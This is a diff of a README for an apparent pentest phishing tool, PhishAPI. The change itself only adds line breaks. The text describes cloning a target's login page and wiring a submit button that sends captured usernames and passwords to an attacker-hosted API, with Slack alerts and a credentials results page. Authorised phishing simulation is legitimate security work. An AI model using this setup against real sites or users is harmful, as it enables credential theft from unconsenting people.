@@ -87,14 +87,14 @@ Rapid & Easy Deployment API for Phishing During Pentest Engagements.  Output to 
 
 	`<buttom value="Submit!" onclick="SubForm('PhishAPI_URL_HERE','NAME/ID_OF_LOGIN_FORM','PROJECT_NAME','SLACK_BOT_NAME','SLACK_EMOJI','USER_FIELD_NAME/ID','PASS_FIELD_NAME/ID','SOURCE_URL_HERE','CSRF_TOKEN_HERE')">`
 	
-	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)
-	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned
-	PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)
-	SLACK_BOT_NAME = I use "PhishBot"
-	SLACK_EMOJI = I use :fishing_pole_and_fish:
-	USER_FIELD_NAME/ID = Name or ID of the username/email field (`<input name="username">` or `<input id="user">`)
-	PASS_FIELD_NAME/ID = Name or ID of the password field (`<input name="password">` or `<input id="pass">`)
-	SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)
+	PhishAPI_URL_HERE = https://YOUR_PHISHAPI_URL.com (wherever you're hosting the API)<br />
+	NAME/ID_OF_LOGIN_FORM = Whatever the cloned `<form name="">` is set to for the page you cloned<br />
+	PROJECT_NAME = Self explanatory. The name of the org/client you're targeting (ex. Walmart)<br />
+	SLACK_BOT_NAME = I use "PhishBot"<br />
+	SLACK_EMOJI = I use `:fishing_pole_and_fish:`<br />
+	USER_FIELD_NAME/ID = Name or ID of the username/email field (`<input name="username">` or `<input id="user">`)<br />
+	PASS_FIELD_NAME/ID = Name or ID of the password field (`<input name="password">` or `<input id="pass">`)<br />
+	SOURCE_URL_HERE = Original Address You Cloned the Site From (ex. https://TARGET_URL.com/logon.html)<br />
 	CSRF_TOKEN_HERE = Leave blank unless the site you're cloning has a CSRF token.  If so provide the Name/ID here (`<input type="hidden" name="csrf_token" value="XDLKJSDLKJLDKJDLKJFSLKLSF">` so "csrf_token" is what you would use)
 
 4) Sit back and wait for the Slack bot to notify you.  When you want to see the credentials visit https://YOUR-API-HERE/results using your basic auth credentials or click the link in the Slack notification.<br><br>
